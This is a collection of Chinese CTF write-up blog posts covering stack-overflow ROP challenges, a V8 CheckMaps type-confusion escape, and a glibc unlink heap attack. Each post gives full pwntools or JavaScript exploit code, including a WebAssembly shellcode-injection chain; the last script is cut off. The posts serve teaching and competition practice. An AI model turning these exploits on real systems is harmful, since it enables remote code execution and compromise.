[{"title":"0CTF_2016_warmup(alarm在rop里的妙用)","url":"/2020/04/17/0CTF_2016_warmup/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n\n\n漏洞很简单，存在一个栈溢出漏洞。难点就在于NX保护开启，不然我们可以布置shellcode。这个程序不依靠glibc，并且栈溢出尺寸太小，并且gadgets少的可怜。几乎不能造出execve的系统调用。查看程序，发现已经有read、write可以使用，如果我们再整出个open系统调用，就能读取文件了。由于栈溢出尺寸太小，因此要想使得eax的值为5，并且能同时调用syscall，不能完成。**[突破点就在于alarm函数了。alarm函数有一个特性，如果多次调用alarm，那么alarm就会返回前一个alarm开始到现在，还剩下多长时间。]{.mark}**比如，第一次alarm(10)，然后过来2s，我们又调用alarm(1234)，那么第二次的alarm返回值eax为10s-2s&#x3D;8s。\n\n\n程序中alarm(0xA)，因此，我们只需要休眠5s，然后再调用一次alarm，就可以使得eax的值为5，从而构造open系统调用。\n#coding:utf8from pwn import *#sh = process(&#x27;./warmup&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,26614)vuln_addr = 0x0804815Aread_addr = 0x0804811Dwrite_addr = 0x08048135data = 0x080491BCsyscall = 0x0804813Aalarm_addr = 0x804810d#先将flag文件名字符串读取到data段payload = &#x27;a&#x27;*0x20 + p32(read_addr) + p32(vuln_addr) + p32(0) + p32(data) + p32(0x10)sh.sendafter(&#x27;Welcome to 0CTF 2016!&#x27;,payload)sh.sendafter(&#x27;Good Luck!&#x27;,&#x27;/flag&#x27;.ljust(0x10,&#x27;\\x00&#x27;))#第二步，打开flag#通过第二次调用alarm，eax的值会返回第一次alarm到现在的间隔值，如果正好为5，就可以打开文件了#因此，我们休眠5sleep(5)payload = &#x27;a&#x27;*0x20 + p32(alarm_addr) + p32(syscall) + p32(vuln_addr) + p32(data) + p32(0)sh.send(payload)#读取flagpayload = &#x27;a&#x27;*0x20 + p32(read_addr) + p32(vuln_addr) + p32(3) + p32(data) + p32(0x30)sh.sendafter(&#x27;Good Luck!&#x27;,payload)#打印flagpayload = &#x27;a&#x27;*0x20 + p32(write_addr) + p32(0) + p32(1) + p32(data) + p32(0x30)sh.sendafter(&#x27;Good Luck!&#x27;,payload)sh.interactive()","categories":["CTF"],"tags":["alarm","栈溢出","ROP"]},{"title":"100levels","url":"/2019/11/09/100levels/","content":"本题是一个栈溢出题，难点在于开启了PIE，因此里面的函数地址是随机的。\n\n\n溢出点在这里\n\n\n让我们看看提示功能的函数\n\n\n看看它的汇编代码\n\n\n不管条件是否成立，system的地址都会保存到这个函数的rbp-110h处，也就是当前函数的栈顶。\n我们再看看这个函数\n\n\n我们进去看看\n\n\n如果我们输入的levels大于0，v7才有初始化，那么，如果没有初始化，它的值会是什么呢?关键点就在这里\n\n\nV7也就是rbp-110h处的数据，由于这个函数和hint函数都是在主函数里依次调用的，它们的rbp是同一个，只是在不同时刻使用而已。那么，如果我们先执行一次hint功能，再进入这个函数，那么，v7就会存储着system的地址！\n现在我们的目的是进入那个有溢出的函数，看看能不能覆盖它的返回地址\n\n\n\n\n这个函数是在go函数里调用的，因此它的rbp也就是go函数的rsp\n进入这个函数后，栈中的布局是这样的\n\n\n在answer函数中，我们的buf是在rbp – 30h处，因此我们要输入30h + 8h &#x3D; 38h个字符，才能覆盖到answer的返回地址。\n\n\n关键是我们不知道，返回地址该覆盖成什么，因为开启了PIE，地址是随机的。然而，在偏移3*8 &#x3D; 24字节处，却保存着system的地址，要是我们能划过这24字节，到system不就好了吗？正如welpwn题那样利用pop划过。然而，pop在这里也用不了，因为是随机地址，我们找不到。\n然而，有一个例外的东西，它的地址是固定的。那就是vsyscall\n\n\nVsyscall用于系统调用，它的地址固定在0xffffffffff600000-0xffffffffff601000，vsyscall在内核中实现，无法用docker模拟。因此某些虚拟机上可能不成功。\n简单地说，现代的Windows&#x2F;*Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。许多对硬件和内核等的操作都会被包装成内核函数并提供一个接口给用户层代码调用，这个接口就是我们熟知的int 0x80&#x2F;syscall+调用号模式。当我们每次调用这个接口时，为了保证数据的隔离，我们需要把当前的上下文(寄存器状态等)保存好，然后切换到内核态运行内核函数，然后将内核函数返回的结果放置到对应的寄存器和内存中，再恢复上下文，切换到用户模式。这一过程需要耗费一定的性能。对于某些系统调用，如gettimeofday来说，由于他们经常被调用，如果每次被调用都要这么来回折腾一遍，开销就会变成一个累赘。因此系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall(引文来自https://bbs.ichunqiu.com/thread-43627-1-1.html)\n我们要利用的就是最后的那个retn，因为它会从栈顶弹出一个元素，就相当于esp下移了一个单位。我们把answer的返回地址处以及栈下面2个都覆盖成vsyscall的地址0xffffffffff600000，那么，栈变成这样\n\n\n这样，三次的vsyscall，相当于从这片区域滑到了Go函数的rsp-110处，这样，接下来就会执行system了。\n然而，system函数需要一个参数，并且x64使用寄存器传参，那么我们就不能用system了。我们考虑用没有参数的函数，我们可以用one-gadget工具查找libc中可用的函数。\n\n\n\n\n\n我们如何让rsp-110h存储着gadget的地址呢，我们只得到了它的静态地址。我们看到那个go函数里.\n\n\n假如，我们输入的数字为n,也就是[rsp-110h] &#x3D; system_addr +n\n假如[rsp-110h] 是gadget的加载地址，那么n &#x3D; gadget_addr - system_addr，我们知道，两个函数之间的偏移是固定的，不管是静态分析，还是动态载入时，它们相对地址是不变的。因此，我们可以用它们在libc中的静态地址，来算出n，我们得到的gadget在libc.so为0x4526a，那么n &#x3D; 0x4526a – libc.sym[‘system’]\n我们需要答对前99题，最后一题，我们再发送payload\n\n\n于是，我们最终写出如下exp脚本\n#coding:utf8  from pwn import *    #sh = process(&#x27;./100levels&#x27;)  sh = remote(&#x27;111.198.29.45&#x27;,32799)  libc = ELF(&#x27;/libc.so&#x27;)    vsyscall = 0xffffffffff600000    system_addr = libc.sym[&#x27;system&#x27;]  execv_gadget = 0x4526a  offset_addr = execv_gadget - system_addr    #先执行2，让system的地址存储到栈里  sh.sendlineafter(&#x27;Choice:\\n&#x27;,&#x27;2&#x27;)    sh.sendlineafter(&#x27;Choice:\\n&#x27;,&#x27;1&#x27;)    sh.sendlineafter(&#x27;How many levels?\\n&#x27;,&#x27;0&#x27;)    sh.sendafter(&#x27;Any more?\\n&#x27;,str(offset_addr))    for i in range(0,99):     sh.recvuntil(&#x27;Question: &#x27;)     a = int(sh.recvuntil(&#x27; &#x27;))     sh.recvuntil(&#x27;* &#x27;)     b = int(sh.recvuntil(&#x27; &#x27;))     sh.sendlineafter(&#x27;Answer:&#x27;,str(a*b))    payload = &#x27;a&#x27;*0x38 + p64(vsyscall)*3    sh.sendafter(&#x27;Answer:&#x27;,payload)    sh.interactive()  \n\n","categories":["CTF"],"tags":["栈溢出","ROP","vsyscall","one_gadget"]},{"title":"250","url":"/2020/02/05/250/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n程序存在明显的栈溢出漏洞\n\n\n并且glibc被静态编译到了程序中\n\n\n由于没有开启PIE，且glibc被静态编译包含，那么我们有很多方式get shell，这里，我们使用的是dl_make_stack_executable使得栈变得可执行，然后在栈里布下shellcode来getshell\n\n\n为了节省步骤，我们直接ret到这里\n\n\n这样，我们就不用担心参数的问题，我们还得事先设置好ebp的值，使得[ebp+arg_10]为__libc_stack_end的地址，目的是为了绕过这里的检查\n\n\n我们发现0x80A0B05处就是__libc_stack_end的地址\n\n\n于是，我们就令ebp为0x80A0B05 - 0x18，这样[ebp+arg_10]为__libc_stack_end的地址\n接下来，为了让_dl_make_stack_executable执行完后，不回到这\n\n\n我们需要利用gadgets修改_dl_make_stack_executable_hook的值\n\n\n我们得让它偏移一个push指令，即改成划线处的地址\n\n\n这样ret时，就会不到原来的地方，而是回到栈里的ROP gadgets\n于是，我们再用jmp esp来继续跳转到栈里，执行shellcode\n综上，我们的exp脚本如下\n#coding:utf8  from pwn import *    #sh = process(&#x27;./pwnh38&#x27;)  sh = remote(&#x27;111.198.29.45&#x27;,52378)  elf = ELF(&#x27;./pwnh38&#x27;)  _dl_make_stack_executable_hook = elf.symbols[&#x27;_dl_make_stack_executable_hook&#x27;]  &#x27;&#x27;&#x27;&#x27;&#x27;调用_dl_make_stack_executable .text:0809A260                 or      ds:__stack_prot, 7 .text:0809A267                 mov     eax, [ebp+arg_10] .text:0809A26A                 call    _dl_make_stack_executable_hook &#x27;&#x27;&#x27;  call_dl_make_stack_executable = 0x809A260  #inc dword ptr [ecx] ; ret  inc_p_ecx = 0x080845f8  pop_ecx = 0x080df1b9  jmp_esp = 0x080de2bb    sh.sendlineafter(&#x27;SSCTF[InPut Data Size]&#x27;,str(0x100))    payload = &#x27;a&#x27;*0x3A + p32(0x80A0B05 - 0x18)  #修改_dl_make_stack_executable_hook，偏移一个push，这样ret时就不会返回到原来的位置  payload += p32(pop_ecx) + p32(_dl_make_stack_executable_hook) + p32(inc_p_ecx)  #调用_dl_make_stack_executable让栈变得可执行，并跳到栈里继续执行shellcode  payload += p32(call_dl_make_stack_executable) + p32(jmp_esp)  #shellcode  payload += asm(shellcraft.i386.linux.sh())    raw_input()  sh.sendlineafter(&#x27;SSCTF[YourData]&#x27;,payload)    sh.interactive()  ","categories":["CTF"],"tags":["栈溢出","shellcode","dl_make_stack_executable"]},{"title":"34c3ctf-v9","url":"/2020/12/31/34c3ctf-v9/","content":"文章首发于安全KER https://www.anquanke.com/post/id/226710\n0x00 前言结合Turbolizer来分析34c3ctf-v9的v8逃逸题\n0x01 patch分析diff --git a/src/compiler/redundancy-elimination.cc b/src/compiler/redundancy-elimination.ccindex 3a40e8d..cb51acc 100644--- a/src/compiler/redundancy-elimination.cc+++ b/src/compiler/redundancy-elimination.cc@@ -5,6 +5,8 @@ #include &quot;src/compiler/redundancy-elimination.h&quot;  #include &quot;src/compiler/node-properties.h&quot;+#include &quot;src/compiler/simplified-operator.h&quot;+#include &quot;src/objects-inl.h&quot;  namespace v8 &#123; namespace internal &#123;@@ -23,6 +25,7 @@ Reduction RedundancyElimination::Reduce(Node* node) &#123;     case IrOpcode::kCheckHeapObject:     case IrOpcode::kCheckIf:     case IrOpcode::kCheckInternalizedString:+    case IrOpcode::kCheckMaps:     case IrOpcode::kCheckNumber:     case IrOpcode::kCheckReceiver:     case IrOpcode::kCheckSmi:@@ -129,6 +132,14 @@ bool IsCompatibleCheck(Node const* a, Node const* b) &#123;     if (a-&gt;opcode() == IrOpcode::kCheckInternalizedString &amp;&amp;         b-&gt;opcode() == IrOpcode::kCheckString) &#123;       // CheckInternalizedString(node) implies CheckString(node)+    &#125; else if (a-&gt;opcode() == IrOpcode::kCheckMaps &amp;&amp;+               b-&gt;opcode() == IrOpcode::kCheckMaps) &#123;+      // CheckMaps are compatible if the first checks a subset of the second.+      ZoneHandleSet&lt;Map&gt; const&amp; a_maps = CheckMapsParametersOf(a-&gt;op()).maps();+      ZoneHandleSet&lt;Map&gt; const&amp; b_maps = CheckMapsParametersOf(b-&gt;op()).maps();+      if (!b_maps.contains(a_maps)) &#123;+        return false;+      &#125;     &#125; else &#123;       return false;     &#125;\n从patch中可以看到，在redundancy-elimination.cc源文件的RedundancyElimination::Reduce函数中增加了一句case IrOpcode::kCheckMaps:，这样对于checkmaps节点，也会进行reduce\nswitch (node-&gt;opcode()) &#123;  case IrOpcode::kCheckBounds:  case IrOpcode::kCheckFloat64Hole:  case IrOpcode::kCheckHeapObject:  case IrOpcode::kCheckIf:  case IrOpcode::kCheckInternalizedString:  case IrOpcode::kCheckMaps:  case IrOpcode::kCheckNumber:  case IrOpcode::kCheckReceiver:  case IrOpcode::kCheckSmi:  case IrOpcode::kCheckString:  case IrOpcode::kCheckSeqString:  case IrOpcode::kCheckNotTaggedHole:  case IrOpcode::kCheckedFloat64ToInt32:  case IrOpcode::kCheckedInt32Add:  case IrOpcode::kCheckedInt32Sub:  case IrOpcode::kCheckedInt32Div:  case IrOpcode::kCheckedInt32Mod:  case IrOpcode::kCheckedInt32Mul:  case IrOpcode::kCheckedTaggedToFloat64:  case IrOpcode::kCheckedTaggedSignedToInt32:  case IrOpcode::kCheckedTaggedToInt32:  case IrOpcode::kCheckedUint32ToInt32:    return ReduceCheckNode(node);\n看到ReduceCheckNode函数\nReduction RedundancyElimination::ReduceCheckNode(Node* node) &#123;  Node* const effect = NodeProperties::GetEffectInput(node);  EffectPathChecks const* checks = node_checks_.Get(effect);  // If we do not know anything about the predecessor, do not propagate just yet  // because we will have to recompute anyway once we compute the predecessor.  if (checks == nullptr) return NoChange();  // See if we have another check that dominates us.  if (Node* check = checks-&gt;LookupCheck(node)) &#123;    ReplaceWithValue(node, check);    return Replace(check);  &#125;  // Learn from this check.  return UpdateChecks(node, checks-&gt;AddCheck(zone(), node));&#125;\n该函数调用LookupCheck(node)获得新值以后，调用ReplaceWithValue(node, check)将原节点进行了替换。继续看到LookupCheck(node)函数，该函数调用了IsCompatibleCheck函数，如果函数返回true，那么就会返回check-&gt;node，从而可以对这个节点进行Reduce消除\nNode* RedundancyElimination::EffectPathChecks::LookupCheck(Node* node) const &#123;  for (Check const* check = head_; check != nullptr; check = check-&gt;next) &#123;    if (IsCompatibleCheck(check-&gt;node, node)) &#123;      DCHECK(!check-&gt;node-&gt;IsDead());      return check-&gt;node;    &#125;  &#125;  return nullptr;&#125;\n而IsCompatibleCheck函数则是被patch过的\nbool IsCompatibleCheck(Node const* a, Node const* b) &#123;  if (a-&gt;op() != b-&gt;op()) &#123;    if (a-&gt;opcode() == IrOpcode::kCheckInternalizedString &amp;&amp;        b-&gt;opcode() == IrOpcode::kCheckString) &#123;      // CheckInternalizedString(node) implies CheckString(node)    &#125; else if (a-&gt;opcode() == IrOpcode::kCheckMaps &amp;&amp;               b-&gt;opcode() == IrOpcode::kCheckMaps) &#123;      // CheckMaps are compatible if the first checks a subset of the second.      ZoneHandleSet&lt;Map&gt; const&amp; a_maps = CheckMapsParametersOf(a-&gt;op()).maps();      ZoneHandleSet&lt;Map&gt; const&amp; b_maps = CheckMapsParametersOf(b-&gt;op()).maps();      if (!b_maps.contains(a_maps)) &#123;        return false;      &#125;    &#125; else &#123;      return false;    &#125;  &#125;  for (int i = a-&gt;op()-&gt;ValueInputCount(); --i &gt;= 0;) &#123;    if (a-&gt;InputAt(i) != b-&gt;InputAt(i)) return false;  &#125;  return true;&#125;\n在patch的内容分支上，程序获得两个checkmaps值，如果a_maps是b_maps的子集，那么变直接返回true，这将使得节点b被Reduce掉\n0x02 POC构造首先构造，我们使用了字典对象，我们仅观察checkmaps的reduce过程\nvar dict = &#123;a:1.1&#125;;function opt(obj_dict) &#123;   var x = obj_dict.a;   var y = new Array(0x10);   return obj_dict.a;&#125;for (var i=0;i&lt;0x20000;i++) &#123;   opt(dict);&#125;print(opt(dict));\n其中为了防止opt函数被直接内联到for语句里，我们在里面增加了一句var y = new Array(0x10);，在代码里，按理来说，var x = obj_dict.a;和return obj_dict.a;都应该有一个checkmaps节点用于进行类型检查。我们还需要先弄清楚RedundancyElimination::ReduceCheckNode函数调用者是来自哪里，因此，我们在该函数下断点，然后用gdb调试。最终发现，该阶段发生在LoadEliminationPhase阶段。接下来，结合IR图来进行验证，运行d8时加入选项--trace-turbo。在Loops peeled 95阶段，43这个节点checkmaps还存在然后到了下一个阶段，也就是Load eliminated 95阶段，43节点的checkmaps被reduce了如果把patch去掉，发现在Load eliminated 95阶段是不会把checkmaps给去掉的根据上述结论，我们进一步构造\nvar dict = &#123;a:1.1&#125;;function opt(obj_dict) &#123;   var x = obj_dict.a;   obj_dict.a = &#123;&#125;;   var y = new Array(0x10);   return obj_dict.a;&#125;for (var i=0;i&lt;0x20000;i++) &#123;   opt(dict,(o)=&gt;1);&#125;print(opt(dict));\n发现没有发生类型混淆，生成IR图进行观察,最后发现最后发现return obj_dict.a;已经是按照对待HOLEY_ELEMENTS类型的方式将值取出的方式。由此，我们考虑加一个函数调用，使得字典对象逃逸，这样由于return obj_dict.a;的checkmaps在Load eliminated 95阶段会被移除，而Escape Analyse阶段在Load eliminated 95阶段之后，那么就可以造成类型混淆\nvar dict = &#123;a:1.1&#125;;function opt(obj_dict,o) &#123;   var x = obj_dict.a;   o(obj_dict);   return obj_dict.a;&#125;for (var i=0;i&lt;0x20000;i++) &#123;   opt(dict,(o)=&gt;i);&#125;print(opt(dict,(o)=&gt;&#123;o.a = dict&#125;));\n测试发现确实发生了类型混淆\nroot@ubuntu:~/Desktop/v8/34c3ctf-v9/x64.debug# ./d8 poc.js1.8632743560757e-310\n分析IR图可以看到，在调用完函数后，没有对dict的类型重新进行检查，那么，我们在函数里改变了dict里a属性的类型，但是代码仍然用的是对待原来double elements的方式来取出值，由此发生类型混淆\n0x03 漏洞利用首先构造addressOf原语\nfunction addressOf_opt(dict,f) &#123;   var x = dict.a;   f(dict);   return dict.a;&#125;var double_dict = &#123;a:1.1&#125;;for (var i=0;i&lt;0x20000;i++) &#123;   addressOf_opt(double_dict,(o)=&gt;1);   addressOf_opt(double_dict,(o)=&gt;2);   addressOf_opt(double_dict,(o)=&gt;3);&#125;function addressOf(obj) &#123;   var x = addressOf_opt(double_dict,(o)=&gt;&#123;o.a = obj&#125;);   return [u64_h(x),u64_l(x) - 0x1];&#125;\n然后构造fakeObject原语\nfunction fakeObject_opt(dict,f,addr) &#123;   var x = dict.b;   f(dict);   dict.b = addr;   return dict;&#125;var obj = &#123;&#125;;var obj_dict = &#123;b:2.2&#125;;for (var i=0;i&lt;0x20000;i++) &#123;   fakeObject_opt(obj_dict,(o)=&gt;1,1.1);   fakeObject_opt(obj_dict,(o)=&gt;2,2.2);   fakeObject_opt(obj_dict,(o)=&gt;3,3.3);&#125;function fakeObject(addr_h,addr_l) &#123;   var obj1 = fakeObject_opt(obj_dict,(o)=&gt;&#123;o.b = obj;&#125;,p64f(addr_l+0x1,addr_h)).b;   return obj1;&#125;\n在构造fakeObject原语时，在fakeObject_opt时，我们没有直接返回dict.b而是返回dict对象，因为我们在前一句有dict.b = addr;，在与return之间没有进行其他逃逸操作，因此直接返回dict.b会在Escape Analyse阶段折叠掉。构造好这两个原语以后，就是常规利用了exp\nvar buf = new ArrayBuffer(0x8);var dv = new DataView(buf);function p64f(value1,value2) &#123;   dv.setUint32(0,value1,true);   dv.setUint32(0x4,value2,true);   return dv.getFloat64(0,true);&#125;function u64_l(value) &#123;   dv.setFloat64(0,value,true);   return dv.getUint32(0,true);&#125;function u64_h(value) &#123;   dv.setFloat64(0,value,true);   return dv.getUint32(4,true);&#125;function addressOf_opt(dict,f) &#123;   var x = dict.a;   f(dict);   return dict.a;&#125;var double_dict = &#123;a:1.1&#125;;for (var i=0;i&lt;0x20000;i++) &#123;   addressOf_opt(double_dict,(o)=&gt;1);   addressOf_opt(double_dict,(o)=&gt;2);   addressOf_opt(double_dict,(o)=&gt;3);&#125;function addressOf(obj) &#123;   var x = addressOf_opt(double_dict,(o)=&gt;&#123;o.a = obj&#125;);   return [u64_h(x),u64_l(x) - 0x1];&#125;function addressOf2_opt(dict,f) &#123;   var x = dict.a2;   f(dict);   return dict.a2;&#125;var double_dict2 = &#123;a2:1.1&#125;;for (var i=0;i&lt;0x20000;i++) &#123;   addressOf2_opt(double_dict2,(o)=&gt;1);   addressOf2_opt(double_dict2,(o)=&gt;2);   addressOf2_opt(double_dict2,(o)=&gt;3);&#125;function addressOf2(obj) &#123;   var x = addressOf2_opt(double_dict2,(o)=&gt;&#123;o.a2 = obj&#125;);   return [u64_h(x),u64_l(x) - 0x1];&#125;function fakeObject_opt(dict,f,addr) &#123;   var x = dict.b;   f(dict);   dict.b = addr;   return dict;&#125;var obj = &#123;&#125;;var obj_dict = &#123;b:2.2&#125;;for (var i=0;i&lt;0x20000;i++) &#123;   fakeObject_opt(obj_dict,(o)=&gt;1,1.1);   fakeObject_opt(obj_dict,(o)=&gt;2,2.2);   fakeObject_opt(obj_dict,(o)=&gt;3,3.3);&#125;function fakeObject(addr_h,addr_l) &#123;   var obj1 = fakeObject_opt(obj_dict,(o)=&gt;&#123;o.b = obj;&#125;,p64f(addr_l+0x1,addr_h)).b;   return obj1;&#125;const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule);var func = wasmInstance.exports.main;var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9,10.10,11.11,12.12];var d = addressOf(faker);var faker_addr_h = d[0];var faker_addr_l = d[1];print(&#x27;faker_addr=&#x27;+faker_addr_h.toString(16) + faker_addr_l.toString(16));d = addressOf2(func);var wasm_shellcode_ptr_addr_h = d[0];var wasm_shellcode_ptr_addr_l = d[1] + 0x38;print(&#x27;wasm_shellcode_ptr=&#x27; + wasm_shellcode_ptr_addr_h.toString(16) + wasm_shellcode_ptr_addr_l.toString(16));var element_addr_l = faker_addr_l + 0x40;print(&#x27;element_addr=&#x27; + faker_addr_h.toString(16) + element_addr_l.toString(16));//fake a ArrayBuffer&#x27;s Mapfaker[0] = p64f(0,0);faker[1] = p64f(0x0f00000a,0x001900c6);faker[2] = p64f(0x082003ff,0);faker[3] = p64f(0,0);//faker a ArrayBufferfaker[4] = p64f(element_addr_l+0x1,faker_addr_h); //mapfaker[5] = p64f(0,0); //propertiesfaker[6] = p64f(0,0); //elementsfaker[7] = p64f(0,0x100); //lengthfaker[8] = p64f(wasm_shellcode_ptr_addr_l,wasm_shellcode_ptr_addr_h);faker[9] = faker[8];faker[10] = p64f(0x100,0)faker[11] = p64f(0x4,0);var arb_ArrayBuffer = fakeObject(faker_addr_h,element_addr_l+0x20);var adv = new DataView(arb_ArrayBuffer);d = adv.getFloat64(0,true);var wasm_shellcode_addr_h = u64_h(d);var wasm_shellcode_addr_l = u64_l(d) + 0x5f;print(&#x27;wasm_shellcode_addr=&#x27; + wasm_shellcode_addr_h.toString(16) + wasm_shellcode_addr_l.toString(16));faker[8] = p64f(wasm_shellcode_addr_l,wasm_shellcode_addr_h);//替换wasm的shellcodefor (var i=0;i&lt;shellcode.length;i++) &#123;   adv.setUint32(i*4,shellcode[i],true);&#125;//执行shellcodefunc();\n0x04 参考从一道CTF题零基础学V8漏洞利用redundancy elimination reducer in v8 and 34c3 ctf v9\n0x05 感想在v8的JIT代码生成过程中，会使用IR来分析程序并且进行优化，v8的IR图使用sea of node思想，其中checkmaps节点是用来做deoptimization的依据，checkmaps节点用于检查对象类型是否符合，如果符合，则直接执行接下来的JIT代码，否则会使用deoptimization，以确保类型正确。\n","categories":["CTF","安全研究"],"tags":["JS引擎漏洞","类型混淆"]},{"title":"4-ReeHY-main","url":"/2019/11/04/4-ReeHY-main/","content":"Libc2.26以下的解法使用的是double free的unlink漏洞\nunlink是利用glibc malloc 的内存回收机制造成攻击的，核心就在于当两个free的堆块在物理上相邻时，会将他们合并，并将原来free的堆块在原来的链表中解链，加入新的链表中，但这样的合并是有条件的，向前或向后合并。\nUnsorted bin使用双向链表维护被释放的空间，如果有一个堆块准备释放，它的物理相邻地址处如果有空闲堆块，并且空闲堆块不是TOP块，则会与相邻的堆块合并，即unlink后。相当于从双向链表里删除P，这里的关键就是FD-&gt;bk &#x3D; BKBK-&gt;fd &#x3D; FD\n#define unlink(P, BK, FD) &#123; \\   FD = P-&gt;fd; \\   BK = P-&gt;bk; \\   if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\     malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P); \\   else &#123; \\     FD-&gt;bk = BK; \\     BK-&gt;fd = FD; \\     ........  &#125;  \n以本题为例\n\n\n0x6020E0处是一个数组，用于保存4个堆的地址，当我们需要编辑时，程序从这个数组里找到对应的堆地址，去访问。假如我们有办法让这个数组里存的是其他地址(比如某些函数的GOT表地址)，那么当我们编辑的时候，不就可以对GOT表修改了吗。\n那么，我们如何做到修改这个数组的内容呢?这个数组只有在创建堆的时候，才有赋值。\n\n\n我们可以利用unlink，先想办法让数组里某一个堆地址指向这个数组的附近，那么我们对那个堆编辑时就是编辑这个数组附近的那个地址。\n假如我们有一个这样的堆\nChunk0(空闲)Prevsize=0   size=0x101Fd =0x6020C8  BK =0x6020D0DATA=XXXXXXXXXXXXXXXXXXXXChunk1(使用中)Prevsize=0x100 size=0x100DATA=xxxxxxxxxxxxxxxxxxxx\n那么，当我们释放chunk1的时候,会与chunk0发生unlink\n首先，内存管理程序检查chunk1的size&#x3D;0x100，即最后的一个bit为0，说明前一个chunk处于空闲状态，那么，它会与前一个块发生合并，即从unsorted bin双向链表里删除前一个块，然后与自己合并后再加入unsorted bin\n那么会调用unlink(prev_chunk(chunk1),NULL,NULL)\n在unlink函数中P &#x3D; chunk0FD&#x3D;chunk0-&gt;fd &#x3D; 0x6020C8BK&#x3D;chunk0-&gt;bk &#x3D; 0x6020D0\n根据chunk的数据结构(请看glibc源码分析)，我们可以知道\nFD-&gt;bk = *(FD+(8*3)) = *(0x6020E0)BK-&gt;fd = *(BK + (8*2)) = *(0x6020E0)而0x6020E0就是存放4个堆地址的数组的地址*(0x6020E0)就是数组的第一个元素，也就是堆0的地址，堆0也就是我们这里的P这样，绕过了corrupted double-linked list检查\n\n接下来\nFD-&gt;bk = BK即*(0x6020E0) = 0x6020D0BK-&gt;fd = FD即*(0x6020E0) = 0x6020C8\n\n即数组的第1个元素被我们改成了0x6020C8，也就是相当于堆0指向了0x6020C8\n\n\n那么，我们编辑堆0也就是在编辑0x6020C8处，而此处的下方就是保存堆指针的数组，那么就可以构造payload来修改这个数组，这就是原理\n通过以上分析，我们可以这样，在真正的chunk0里，构造一个假的chunk，并伪造它的状态为释放的状态。\n要达到这个目的，就需要堆溢出，覆盖chunk1的头信息\n首先，这个程序的delete功能没有检查下标为负数的情况\n\n\n经过调试，当我们delete(-2)时，释放的正好是0x6020C0处元素指向的堆(保存4个堆大小的堆)\n\n\n它的大小为0x14，释放后归于fastbin\n\n\n当我们再次malloc(0x14)申请时，便会返回这个释放后的堆的地址(fastbin的特性，使用单向链表维护释放后的块，再次申请时最先返回最后放入的那个块，类似于栈)，于是我们编辑申请的这个堆，就是编辑保存4个堆大小的堆，这个大小信息在 编辑功能时会用到，我们要先溢出堆，就需要修改大小限制\n\n\n我们edit申请的这个堆，构造payload，修改第一个堆的大小信息为0x200，这样我们在edit第一个堆时，就能溢出了\n那么接下来，就是构造假的堆，来触发unlink了。\nChunk1的prev_size和size也是关键\n#define prev_chunk(p) ((mchunkptr)( ((char*)(p)) - ((p)-&gt;prev_size) ))  \n\nChunk1的地址减去prev_size就是chunk0,还有就是size的最后1个bit为0，代表前一个块chunk0处于空闲状态\n实际上，真正的chunk0是chunk1-0x110，因为chunk0也有prev_size和size字段，我们这里构造假的空闲chunk0’，并且chunk1的prev_size为0x100，让系统误以为chunk0是在chunk1-0x100处开始的，这就骗过了系统。\n至于那个假的chunk的fd和bk，它的值关键，既要绕过检测，也要达到我们的目的。这里有一个公式，假如，被unlink的块P指针的地址为Paddr，那么设置fd&#x3D;Paddr – 0x18，设置bk &#x3D; Paddr – 0x10，根据chunk的数据结构可以很容易推出，最终导致P的指针指向了Paddr – 0x18\n那么接下来，我们就可以修改数组里保存的4个堆指针了，让它们指向一些关键的地方。然后再分别edit(0,xx),edit(1,xxx),edit(2,xxx),edit(3,xxxx)，修改关键地方的数据。比如修改got表。最终getshell。\n我们完整的脚本\n#coding:utf8  #注意glib 2.26开始，加入了tcache机制，本方案不在试用，但仍然可以利用其它方案  from pwn import *  from LibcSearcher import *    context.log_level = &#x27;debug&#x27;  sh = process(&#x27;./4-ReeHY-main&#x27;)  #elf = ELF(&#x27;./4-ReeHY-main&#x27;)  #libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)    #sh = remote(&#x27;111.198.29.45&#x27;,54211)    def welcome():     sh.sendlineafter(&#x27;$&#x27;,&#x27;seaase&#x27;)    def create(size,index,content):     sh.sendlineafter(&#x27;$&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;Input size\\n&#x27;,str(size))     sh.sendlineafter(&#x27;Input cun\\n&#x27;,str(index))     sh.sendafter(&#x27;Input content\\n&#x27;,content)    def delete(index):     sh.sendlineafter(&#x27;$&#x27;,&#x27;2&#x27;)     sh.sendlineafter(&#x27;Chose one to dele\\n&#x27;,str(index))    def edit(index,content):     sh.sendlineafter(&#x27;$&#x27;,&#x27;3&#x27;)     sh.sendlineafter(&#x27;Chose one to edit\\n&#x27;,str(index))     sh.sendafter(&#x27;Input the content\\n&#x27;,content)    #处理开始  welcome()  #先创建两个0x100的堆(不要太大，也不要太小,这样使用unsorted bin)  